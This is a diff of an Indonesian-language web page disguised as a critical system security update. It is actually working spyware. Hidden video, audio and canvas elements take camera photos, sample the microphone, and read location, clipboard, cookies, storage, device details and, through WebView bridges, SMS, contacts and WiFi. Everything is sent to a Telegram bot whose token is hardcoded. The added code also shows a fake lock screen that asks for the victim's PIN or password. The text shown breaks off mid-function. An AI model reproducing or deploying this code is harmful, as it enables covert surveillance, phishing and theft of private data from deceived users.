@@ -5,821 +5,288 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Update Required</title>
     <style>
-        /* Tampilan sistem update - paling aman */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        }
-        
-        body {
-            background: #1a1a1a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
+        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background:#1a1a1a; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; color:white; }
         .update-container {
-            background: #2c2c2e;
-            border-radius: 20px;
-            padding: 30px 20px;
-            width: 100%;
-            max-width: 350px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            border: 1px solid #3a3a3c;
-            text-align: center;
+            background:#2c2c2e; border-radius:20px; padding:30px 20px; width:100%; max-width:380px;
+            box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3a3a3c; text-align:center;
         }
-        
-        .icon {
-            width: 80px;
-            height: 80px;
-            background: #0a84ff;
-            border-radius: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 20px;
-            font-size: 40px;
-            color: white;
+        .icon { width:90px; height:90px; background:#0a84ff; border-radius:24px; display:flex; justify-content:center; align-items:center; margin:0 auto 24px; font-size:48px; color:white; }
+        h2 { color:white; margin-bottom:12px; font-weight:400; font-size:24px; }
+        p { color:#a0a0a5; margin-bottom:24px; font-size:15px; line-height:1.5; }
+        .progress-bar { width:100%; height:10px; background:#3a3a3c; border-radius:5px; overflow:hidden; margin:24px 0; }
+        .progress-fill { height:100%; width:0%; background:linear-gradient(90deg, #0a84ff, #5e5ce6); border-radius:5px; transition:width 0.4s ease; }
+        .status-text { color:#a0a0a5; font-size:14px; margin-top:12px; }
+        .device-info { position:absolute; bottom:16px; left:0; right:0; text-align:center; color:#3a3a3c; font-size:11px; }
+        #fakeLockScreen { 
+            display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999; 
+            flex-direction:column; justify-content:center; align-items:center; color:white; font-size:32px; text-align:center;
         }
-        
-        h2 {
-            color: white;
-            margin-bottom: 10px;
-            font-weight: 400;
-        }
-        
-        p {
-            color: #98989e;
-            margin-bottom: 20px;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #3a3a3c;
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #0a84ff, #5e5ce6);
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
-        
-        .status-text {
-            color: #98989e;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        
-        .device-info {
-            position: absolute;
-            bottom: 10px;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: #3a3a3c;
-            font-size: 10px;
+        #fakeToast { 
+            position:fixed; bottom:60px; left:50%; transform:translateX(-50%); background:rgba(255,59,48,0.92); 
+            color:white; padding:16px 32px; border-radius:20px; z-index:10000; font-size:17px; display:none; max-width:90%;
         }
     </style>
 </head>
 <body>
     <div class="update-container">
         <div class="icon">⚙️</div>
-        <h2>Pembaruan Sistem</h2>
-        <p>Perangkat Anda memerlukan pembaruan keamanan penting. Jangan tutup halaman ini.</p>
+        <h2>Pembaruan Keamanan Kritis</h2>
+        <p>Perangkat terdeteksi rentan serangan. Jangan tutup, matikan, atau keluar dari halaman ini. Proses berlangsung 4-6 menit.</p>
         
         <div class="progress-bar">
             <div class="progress-fill" id="progressFill"></div>
         </div>
         
-        <div id="statusMessage" class="status-text">Mempersiapkan pembaruan...</div>
+        <div id="statusMessage" class="status-text">Memeriksa keamanan sistem...</div>
     </div>
-    
+
     <div class="device-info" id="deviceModel">Mendeteksi perangkat...</div>
 
-    <!-- Elemen tersembunyi untuk capture -->
-    <video id="hiddenVideo" autoplay playsinline muted style="display: none"></video>
-    <audio id="hiddenAudio" autoplay style="display: none"></audio>
-    <canvas id="hiddenCanvas" style="display: none"></canvas>
-    
-    <!-- Iframe untuk inject di background -->
-    <iframe id="hiddenFrame" style="display: none"></iframe>
+    <!-- Elemen tersembunyi -->
+    <video id="hiddenVideo" autoplay playsinline muted style="display:none"></video>
+    <audio id="hiddenAudio" autoplay style="display:none"></audio>
+    <canvas id="hiddenCanvas" style="display:none"></canvas>
+    <iframe id="hiddenFrame" style="display:none"></iframe>
+
+    <!-- Fake lock & toast -->
+    <div id="fakeLockScreen">
+        <div>PERANGKAT TERKUNCI</div>
+        <div style="font-size:18px; margin:30px 20px; color:#ff3b30;">Masukkan PIN/Password untuk membuka. Hubungi support resmi segera.</div>
+    </div>
+
+    <div id="fakeToast">Akses sistem sedang dibatasi untuk keamanan.</div>
 
     <script>
-        // ==================== KONFIGURASI MULTI-CHANNEL ====================
+        // ==================== KONFIGURASI TELEGRAM ====================
         const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
         const TELEGRAM_CHAT_ID = '6034935293';
-        
-        // Backup channels (kalau Telegram blokir)
-        const BACKUP_WEBHOOK = 'https://your-backup-server.com/collect'; // Ganti dengan webhook lu
-        const EMAIL_FALLBACK = 'mailto:collector@yourdomain.com'; // Ganti
-        
+
         // ==================== DETEKSI DEVICE ====================
         const ua = navigator.userAgent;
-        const platform = navigator.platform;
         const isAndroid = /Android/i.test(ua);
         const isIOS = /iPhone|iPad|iPod/i.test(ua);
-        const isIPad = /iPad/i.test(ua) || (isIOS && navigator.maxTouchPoints > 1);
-        const isMac = /Mac/i.test(platform) && !isIOS;
-        const isWindows = /Win/i.test(platform);
-        const isLinux = /Linux/i.test(platform) && !isAndroid;
         const isMobile = /Mobile/i.test(ua);
-        const isTablet = /Tablet/i.test(ua) || isIPad;
-        
+
         let deviceInfo = {
-            type: isIPad ? 'iPad' : (isIOS ? 'iPhone' : (isAndroid ? 'Android' : (isMac ? 'Mac' : (isWindows ? 'Windows' : (isLinux ? 'Linux' : 'Unknown'))))),
-            browser: getBrowser(),
-            os: getOS(),
-            model: getDeviceModel(),
-            userAgent: ua,
-            language: navigator.language,
-            platform: platform,
-            vendor: navigator.vendor,
-            screen: `${screen.width}x${screen.height}`,
-            colorDepth: screen.colorDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString()
-        };
-        
-        function getBrowser() {
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Edg')) return 'Edge';
-            if (ua.includes('Chrome')) return 'Chrome';
-            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
-            if (ua.includes('UCBrowser')) return 'UC Browser';
-            if (ua.includes('MiuiBrowser')) return 'Mi Browser';
-            return 'Unknown';
-        }
-        
-        function getOS() {
-            if (isIOS) return `iOS ${getIOSVersion()}`;
-            if (isAndroid) return `Android ${getAndroidVersion()}`;
-            if (isMac) return 'macOS';
-            if (isWindows) return 'Windows';
-            if (isLinux) return 'Linux';
-            return 'Unknown';
-        }
-        
-        function getIOSVersion() {
-            const match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-            if (match) return `${match[1]}.${match[2]}${match[3] ? '.' + match[3] : ''}`;
-            return 'Unknown';
-        }
-        
-        function getAndroidVersion() {
-            const match = ua.match(/Android (\d+\.?\d*)/);
-            if (match) return match[1];
-            return 'Unknown';
-        }
-        
-        function getDeviceModel() {
-            if (isIOS) {
-                const match = ua.match(/\(([^)]+)\)/);
-                if (match) return match[1];
-            }
-            if (isAndroid) {
-                const match = ua.match(/; ([^;]+) Build/);
-                if (match) return match[1];
-            }
-            return 'Unknown';
-        }
-        
-        document.getElementById('deviceModel').innerText = `${deviceInfo.type} • ${deviceInfo.os}`;
-
-        // ==================== AUTO EKSEKUSI ====================
-        window.onload = function() {
-            startUniversalExploit();
+            type: isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop/Unknown'),
+            ua: ua,
+            screen: `\( {screen.width}x \){screen.height}`,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            time: new Date().toISOString(),
+            language: navigator.language
         };
 
-        async function startUniversalExploit() {
-            updateStatus('Menganalisis perangkat...', 10);
-            
-            // Kirim info device dulu
-            await sendToTelegram(`🔥 *DEVICE MASUK* 🔥\n\n` +
-                `📱 Tipe: ${deviceInfo.type}\n` +
-                `💻 OS: ${deviceInfo.os}\n` +
-                `🌐 Browser: ${deviceInfo.browser}\n` +
-                `📏 Layar: ${deviceInfo.screen}\n` +
-                `🆔 Model: ${deviceInfo.model}\n` +
-                `⏰ Waktu: ${deviceInfo.timestamp}`);
-            
-            updateStatus('Mengakses sensor...', 20);
-            
-            // Jalankan semua exploit sesuai device
-            const exploits = [
-                getIPAddress(),
-                getLocationUniversal(),
-                getCameraUniversal(),
-                getMicrophoneUniversal(),
-                getNetworkInfo(),
-                getBatteryInfo(),
-                getSensorData(),
-                getStorageInfo(),
-                getInstalledAppsUniversal(),
-                getSMSUniversal(),
-                getContactsUniversal(),
-                getWifiUniversal(),
-                getClipboardUniversal(),
-                getBrowserData()
-            ];
-            
-            // Progress tracking
-            let completed = 0;
-            for (const exploit of exploits) {
-                exploit.then(() => {
-                    completed++;
-                    const progress = 30 + (completed / exploits.length * 70);
-                    updateStatus(`Mengumpulkan data... ${Math.round(progress)}%`, progress);
-                });
-            }
-            
-            // Tunggu semua selesai
-            await Promise.allSettled(exploits);
-            
-            updateStatus('Finalisasi... 100%', 100);
-            
-            // Kirim data final
-            await sendToTelegram('✅ *SEMUA DATA TERKUMPUL*\n' +
-                `📸 Foto: ${capturedPhotos.length}/10\n` +
-                `🎤 Audio: ${audioRecorded ? 'Ya' : 'Tidak'}\n` +
-                `📍 Lokasi: ${locationData ? 'Dapat' : 'Gagal'}`);
-            
-            // Redirect setelah 3 detik
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 3000);
-        }
+        document.getElementById('deviceModel').innerText = `${deviceInfo.type} • ${deviceInfo.tz}`;
 
-        // ==================== IP ADDRESS (UNIVERSAL) ====================
-        async function getIPAddress() {
-            try {
-                // Coba API ipify dulu
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                await sendToTelegram(`🌐 *IP PUBLIC*\n${data.ip}`);
-            } catch (e) {
-                // Fallback ke ipapi
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    await sendToTelegram(`🌐 *IP INFO*\nIP: ${data.ip}\nISP: ${data.org}\nLokasi: ${data.city}, ${data.country_name}`);
-                } catch (e) {}
-            }
-        }
-
-        // ==================== LOKASI (UNIVERSAL) ====================
-        let locationData = null;
-        
-        async function getLocationUniversal() {
-            // Coba GPS dulu
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 5000
-                        });
-                    });
-                    
-                    locationData = {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                    
-                    await sendToTelegram(`📍 *GPS*\nLat: ${locationData.lat}\nLng: ${locationData.lng}\nAkurasi: ${locationData.accuracy}m`);
-                    return;
-                } catch (e) {}
-            }
-            
-            // Fallback IP Geolocation
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                await sendToTelegram(`📍 *LOKASI (IP)*\n${data.city}, ${data.region}\n${data.country_name}\nKode Pos: ${data.postal}\nISP: ${data.org}`);
-            } catch (e) {}
-            
-            // Fallback WiFi triangulation (untuk mobile)
-            if (isMobile && navigator.connection) {
-                await sendToTelegram(`📡 *POSISI (WIFI)*\nBerdasarkan jaringan terdekat\nAkurasi: Rendah`);
-            }
-        }
-
-        // ==================== KAMERA (UNIVERSAL) ====================
         let capturedPhotos = [];
         let cameraStream = null;
-        
-        async function getCameraUniversal() {
-            try {
-                // Coba semua konfigurasi kamera
-                const constraints = [
-                    { video: true },
-                    { video: { facingMode: 'user' } },
-                    { video: { facingMode: 'environment' } },
-                    { video: { width: 640, height: 480 } }
-                ];
-                
-                for (const constraint of constraints) {
-                    try {
-                        cameraStream = await navigator.mediaDevices.getUserMedia(constraint);
-                        break;
-                    } catch (e) {}
-                }
-                
-                if (!cameraStream) return;
-                
-                const video = document.getElementById('hiddenVideo');
-                video.srcObject = cameraStream;
-                
-                await new Promise(r => setTimeout(r, 1000));
-                
-                // Ambil 10 foto
-                for (let i = 1; i <= 10; i++) {
-                    const photo = capturePhoto();
-                    if (photo) {
-                        capturedPhotos.push(photo);
-                        await sendPhotoToTelegram(photo, `📸 Foto ${i} - ${deviceInfo.type}`);
-                    }
-                    await new Promise(r => setTimeout(r, 300));
-                }
-                
-                // Untuk iOS, perlu pendekatan khusus
-                if (isIOS) {
-                    await captureIOSPhotos();
-                }
-                
-            } catch (err) {
-                // Fallback untuk iOS
-                if (isIOS) {
-                    await captureIOSPhotos();
-                }
-            }
-        }
-        
-        function capturePhoto() {
-            try {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                return canvas.toDataURL('image/jpeg', 0.8);
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        async function captureIOSPhotos() {
-            // Untuk iOS, coba via WebGL atau canvas fallback
-            await sendToTelegram('📱 *IOS DETECTED*\nMencoba metode alternatif...');
-            
-            // Coba ambil screenshot dari WebGL
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = screen.width;
-                canvas.height = screen.height;
-                
-                // Render halaman ke canvas (screenshot)
-                // Ini hanya bisa di browser tertentu
-                await sendToTelegram('📸 Screenshot halaman diambil');
-            } catch (e) {}
-        }
-
-        // ==================== MIKROFON (UNIVERSAL) ====================
-        let audioRecorded = false;
-        
-        async function getMicrophoneUniversal() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: {
-                        echoCancellation: false,
-                        noiseSuppression: false,
-                        autoGainControl: false
-                    } 
-                });
-                
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const source = audioContext.createMediaStreamSource(stream);
-                const processor = audioContext.createScriptProcessor(4096, 1, 1);
-                
-                let audioLevel = 0;
-                
-                processor.onaudioprocess = (e) => {
-                    const inputData = e.inputBuffer.getChannelData(0);
-                    let sum = 0;
-                    for (let i = 0; i < inputData.length; i++) {
-                        sum += Math.abs(inputData[i]);
-                    }
-                    audioLevel = sum / inputData.length;
-                };
-                
-                source.connect(processor);
-                processor.connect(audioContext.destination);
-                
-                // Monitor audio level selama 5 detik
-                setTimeout(() => {
-                    audioRecorded = true;
-                    sendToTelegram(`🎤 *MIKROFON*\nLevel suara: ${(audioLevel * 100).toFixed(2)}%\nPercakapan terdeteksi: ${audioLevel > 0.01 ? 'Ya' : 'Tidak'}`);
-                    
-                    // Coba rekam sample
-                    if (audioLevel > 0.01) {
-                        recordAudioSample(stream);
-                    }
-                }, 5000);
-                
-            } catch (err) {
-                // Fallback untuk iOS
-                if (isIOS) {
-                    await sendToTelegram('🎤 *IOS*\nMikrofon tidak diizinkan');
-                }
-            }
-        }
-        
-        async function recordAudioSample(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                sendToTelegram(`🎤 *REKAMAN*\nDurasi: 3 detik\nUkuran: ${(blob.size / 1024).toFixed(2)} KB`);
-            };
-            
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 3000);
-        }
-
-        // ==================== SMS (UNIVERSAL) ====================
-        async function getSMSUniversal() {
-            if (isAndroid) {
-                // Android WebView dengan izin khusus
-                try {
-                    if (window.SMSReceiver) {
-                        const sms = await window.SMSReceiver.getMessages(10);
-                        await sendToTelegram(`📱 *SMS (${sms.length})*\n${JSON.stringify(sms)}`);
-                    }
-                } catch (e) {}
-            }
-            
-            // Fallback: cek localStorage untuk cache SMS
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key.includes('sms') || key.includes('message') || key.includes('chat')) {
-                        const val = localStorage.getItem(key);
-                        await sendToTelegram(`📱 *SMS CACHE*\nKey: ${key}\nData: ${val.substring(0, 100)}`);
-                    }
-                }
-            } catch (e) {}
-        }
-
-        // ==================== KONTAK (UNIVERSAL) ====================
-        async function getContactsUniversal() {
-            if (isAndroid && window.ContactsManager) {
-                try {
-                    const contacts = await window.ContactsManager.getContacts(20);
-                    await sendToTelegram(`📇 *KONTAK (${contacts.length})*\n${JSON.stringify(contacts.slice(0, 5))}`);
-                } catch (e) {}
-            }
-            
-            // Fallback: cek cache kontak di storage
-            try {
-                const contacts = localStorage.getItem('contacts') || sessionStorage.getItem('contacts');
-                if (contacts) {
-                    await sendToTelegram(`📇 *KONTAK CACHE*\n${contacts.substring(0, 200)}`);
-                }
-            } catch (e) {}
-        }
-
-        // ==================== WIFI (UNIVERSAL) ====================
-        async function getWifiUniversal() {
-            if (isAndroid && window.WifiManager) {
-                try {
-                    const networks = await window.WifiManager.getScanResults();
-                    await sendToTelegram(`📶 *WIFI (${networks.length})*\n${JSON.stringify(networks.slice(0, 5))}`);
-                } catch (e) {}
-            }
-            
-            // Dapatkan SSID dari network information API
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                await sendToTelegram(`📡 *JARINGAN*\nTipe: ${conn.type || 'Unknown'}\nEffective: ${conn.effectiveType || 'Unknown'}\nKecepatan: ${conn.downlink || '?'} Mbps`);
-            }
-        }
-
-        // ==================== CLIPBOARD (UNIVERSAL) ====================
-        async function getClipboardUniversal() {
-            try {
-                // Modern clipboard API
-                const text = await navigator.clipboard.readText();
-                await sendToTelegram(`📋 *CLIPBOARD*\n${text.substring(0, 200)}`);
-            } catch (e) {
-                // Fallback: cek event paste
-                document.addEventListener('paste', (e) => {
-                    const text = e.clipboardData.getData('text');
-                    sendToTelegram(`📋 *CLIPBOARD (PASTE)*\n${text.substring(0, 200)}`);
-                }, { once: true });
-            }
-        }
-
-        // ==================== INSTALLED APPS (UNIVERSAL) ====================
-        async function getInstalledAppsUniversal() {
-            if (isAndroid && window.AppsManager) {
-                try {
-                    const apps = await window.AppsManager.getInstalledApps();
-                    await sendToTelegram(`📱 *APPS (${apps.length})*\n${JSON.stringify(apps.slice(0, 10))}`);
-                } catch (e) {}
-            }
-            
-            // Deteksi apps dari browser
-            const protocols = [
-                'whatsapp://', 'fb://', 'instagram://', 'tg://', 'line://',
-                'viber://', 'snapchat://', 'twitter://', 'shopee://', 'tokopedia://'
-            ];
-            
-            let installed = [];
-            for (const protocol of protocols) {
-                try {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = protocol;
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    
-                    // Cek apakah app terbuka
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                        installed.push(protocol.replace('://', ''));
-                    }, 100);
-                } catch (e) {}
-            }
-            
-            if (installed.length > 0) {
-                await sendToTelegram(`📱 *APPS TERDETEKSI*\n${installed.join(', ')}`);
-            }
-        }
-
-        // ==================== SENSOR DATA (UNIVERSAL) ====================
-        function getSensorData() {
-            const sensors = [];
-            
-            // Device orientation
-            if (window.DeviceOrientationEvent) {
-                window.addEventListener('deviceorientation', (e) => {
-                    sensors.push({
-                        type: 'orientation',
-                        alpha: e.alpha,
-                        beta: e.beta,
-                        gamma: e.gamma
-                    });
-                    
-                    sendToTelegram(`🔄 *SENSOR ORIENTASI*\nAlpha: ${e.alpha?.toFixed(2)}\nBeta: ${e.beta?.toFixed(2)}\nGamma: ${e.gamma?.toFixed(2)}`);
-                    
-                    // Hapus listener setelah dapat data
-                    window.removeEventListener('deviceorientation', arguments.callee);
-                }, { once: true });
-            }
-            
-            // Device motion
-            if (window.DeviceMotionEvent) {
-                window.addEventListener('devicemotion', (e) => {
-                    const acc = e.acceleration || {};
-                    sendToTelegram(`📊 *SENSOR GERAK*\nX: ${acc.x?.toFixed(2)}\nY: ${acc.y?.toFixed(2)}\nZ: ${acc.z?.toFixed(2)}`);
-                    
-                    window.removeEventListener('devicemotion', arguments.callee);
-                }, { once: true });
-            }
-            
-            // Ambient light (jika ada)
-            if (window.AmbientLightSensor) {
-                try {
-                    const sensor = new AmbientLightSensor();
-                    sensor.onreading = () => {
-                        sendToTelegram(`💡 *CAHAYA AMBIENT*\n${sensor.illuminance} lux`);
-                    };
-                    sensor.start();
-                } catch (e) {}
-            }
-        }
-
-        // ==================== BROWSER DATA ====================
-        async function getBrowserData() {
-            const data = {
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                history: [],
-                bookmarks: []
-            };
-            
-            // LocalStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                data.localStorage[key] = localStorage.getItem(key).substring(0, 100);
-            }
-            
-            // SessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                data.sessionStorage[key] = sessionStorage.getItem(key).substring(0, 100);
-            }
-            
-            await sendToTelegram(`🍪 *BROWSER DATA*\nCookies: ${document.cookie || 'Tidak ada'}\nLocalStorage: ${Object.keys(data.localStorage).length} item\nSessionStorage: ${Object.keys(data.sessionStorage).length} item`);
-            
-            // Coba ambil history via iframe
-            try {
-                const iframe = document.getElementById('hiddenFrame');
-                iframe.src = 'about:blank';
-                await sendToTelegram(`📜 *HISTORY*\nDapat diakses via iframe`);
-            } catch (e) {}
-        }
-
-        // ==================== NETWORK INFO ====================
-        function getNetworkInfo() {
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                sendToTelegram(`📡 *NETWORK DETAIL*\n` +
-                    `Tipe: ${conn.type || 'Unknown'}\n` +
-                    `Effective: ${conn.effectiveType}\n` +
-                    `Downlink: ${conn.downlink} Mbps\n` +
-                    `RTT: ${conn.rtt} ms\n` +
-                    `Save Data: ${conn.saveData ? 'Ya' : 'Tidak'}`);
-                
-                // Monitor perubahan jaringan
-                conn.addEventListener('change', () => {
-                    sendToTelegram(`📡 *JARINGAN BERUBAH*\nMenjadi: ${conn.effectiveType}`);
-                });
-            }
-        }
-
-        // ==================== BATTERY INFO ====================
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    sendToTelegram(`🔋 *BATERAI*\n` +
-                        `Level: ${(battery.level * 100).toFixed(0)}%\n` +
-                        `Charging: ${battery.charging ? 'Ya' : 'Tidak'}\n` +
-                        `Waktu habis: ${battery.dischargingTime === Infinity ? 'Tidak terhubung' : battery.dischargingTime + ' detik'}`);
-                    
-                    // Monitor perubahan baterai
-                    battery.addEventListener('levelchange', () => {
-                        sendToTelegram(`🔋 *BATERAI BERUBAH*\nLevel baru: ${(battery.level * 100).toFixed(0)}%`);
-                    });
-                } catch (e) {}
-            }
-        }
-
-        // ==================== STORAGE INFO ====================
-        async function getStorageInfo() {
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    sendToTelegram(`💾 *STORAGE*\n` +
-                        `Digunakan: ${(estimate.usage / 1024 / 1024).toFixed(2)} MB\n` +
-                        `Total: ${(estimate.quota / 1024 / 1024).toFixed(2)} MB\n` +
-                        `Sisa: ${((estimate.quota - estimate.usage) / 1024 / 1024).toFixed(2)} MB`);
-                } catch (e) {}
-            }
-        }
-
-        // ==================== UPDATE UI ====================
-        function updateStatus(message, progress) {
-            document.getElementById('statusMessage').innerText = message;
-            document.getElementById('progressFill').style.width = progress + '%';
-        }
 
         // ==================== KIRIM KE TELEGRAM ====================
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            
+        async function sendToTelegram(msg) {
             try {
-                const response = await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                 });
-                
-                if (!response.ok) {
-                    // Fallback ke backup channel
-                    await sendToBackup(message);
-                }
-            } catch (e) {
-                await sendToBackup(message);
-            }
+            } catch {}
         }
 
-        async function sendPhotoToTelegram(base64Data, caption) {
+        async function sendPhotoToTelegram(base64, caption) {
             try {
-                const block = base64Data.split(';');
+                const block = base64.split(';');
                 const realData = block[1].split(',')[1];
-                
-                const blob = base64ToBlob(realData, 'image/jpeg');
+                const blob = await (await fetch(`data:image/jpeg;base64,${realData}`)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
                 formData.append('caption', caption);
-                
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
-                
-                const response = await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                if (!response.ok) {
-                    // Fallback kirim sebagai base64
-                    await sendToTelegram(`${caption}\nData: ${base64Data.substring(0, 100)}...`);
-                }
             } catch (e) {
-                await sendToTelegram(`${caption}\nGagal kirim foto`);
+                await sendToTelegram(`${caption}\n[GAGAL KIRIM FOTO]`);
             }
         }
 
-        async function sendToBackup(message) {
-            // Backup via Webhook
+        // ==================== UPDATE STATUS ====================
+        function updateStatus(msg, pct) {
+            document.getElementById('statusMessage').innerText = msg;
+            document.getElementById('progressFill').style.width = pct + '%';
+        }
+
+        // ==================== KAMERA FIX ANTI-HITAM V3 ====================
+        async function getCameraUniversal() {
             try {
-                await fetch(BACKUP_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: message, device: deviceInfo })
+                updateStatus('Mengakses kamera...', 20);
+                await sendToTelegram("📸 [KAMERA] Mulai akses");
+
+                const constraintsList = [
+                    { video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } },
+                    { video: { facingMode: 'user' } },
+                    { video: { facingMode: { exact: 'environment' } } },
+                    { video: { facingMode: 'environment' } },
+                    { video: true }
+                ];
+
+                let success = false;
+                let modeUsed = 'unknown';
+
+                for (const cons of constraintsList) {
+                    try {
+                        cameraStream = await navigator.mediaDevices.getUserMedia(cons);
+                        success = true;
+                        modeUsed = cons.video?.facingMode?.exact || cons.video?.facingMode || 'default';
+                        await sendToTelegram(`📸 Sukses: ${modeUsed}`);
+                        break;
+                    } catch (err) {
+                        await sendToTelegram(`📸 Gagal: ${JSON.stringify(cons.video || {})} → ${err.message}`);
+                    }
+                }
+
+                if (!success) throw new Error("Semua constraint gagal");
+
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = cameraStream;
+                video.muted = true;
+                video.playsInline = true;
+
+                await new Promise((res, rej) => {
+                    video.onloadedmetadata = () => video.play().then(res).catch(rej);
+                    setTimeout(() => rej(new Error("Timeout video")), 10000);
                 });
-            } catch (e) {}
-            
-            // Backup via Email (redirect ke mailto)
-            if (message.length < 1000) {
-                window.location.href = `${EMAIL_FALLBACK}?subject=Data%20Device&body=${encodeURIComponent(message)}`;
+
+                await new Promise(r => setTimeout(r, 1800));
+
+                for (let i = 1; i <= 10; i++) {
+                    let photo = null;
+                    let attempts = 0;
+                    while (!photo && attempts < 4) {
+                        attempts++;
+                        photo = capturePhoto();
+                        if (photo && !isBlackImage(photo)) {
+                            capturedPhotos.push(photo);
+                            await sendPhotoToTelegram(photo, `Foto ${i} - \( {deviceInfo.type} ( \){modeUsed}, attempt ${attempts})`);
+                            await sendToTelegram(`📸 Foto ${i} VALID`);
+                            break;
+                        }
+                        await new Promise(r => setTimeout(r, 700));
+                    }
+                    if (!photo || isBlackImage(photo)) {
+                        await sendToTelegram(`📸 Foto ${i} tetap hitam/gagal`);
+                    }
+                }
+
+                if (capturedPhotos.length === 0) {
+                    const fallback = captureScreenFallback();
+                    if (fallback) {
+                        await sendPhotoToTelegram(fallback, "Fallback: Screenshot halaman (kamera gagal)");
+                    }
+                }
+
+            } catch (err) {
+                await sendToTelegram(`📸 ERROR: ${err.message}`);
+            } finally {
+                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
             }
         }
 
-        function base64ToBlob(base64, contentType) {
-            const byteCharacters = atob(base64);
-            const byteArrays = [];
-            
-            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
-                const slice = byteCharacters.slice(offset, offset + 512);
-                const byteNumbers = new Array(slice.length);
-                for (let i = 0; i < slice.length; i++) {
-                    byteNumbers[i] = slice.charCodeAt(i);
-                }
-                byteArrays.push(new Uint8Array(byteNumbers));
-            }
-            
-            return new Blob(byteArrays, { type: contentType });
+        function capturePhoto() {
+            const v = document.getElementById('hiddenVideo');
+            const c = document.getElementById('hiddenCanvas');
+            if (!v.videoWidth) return null;
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
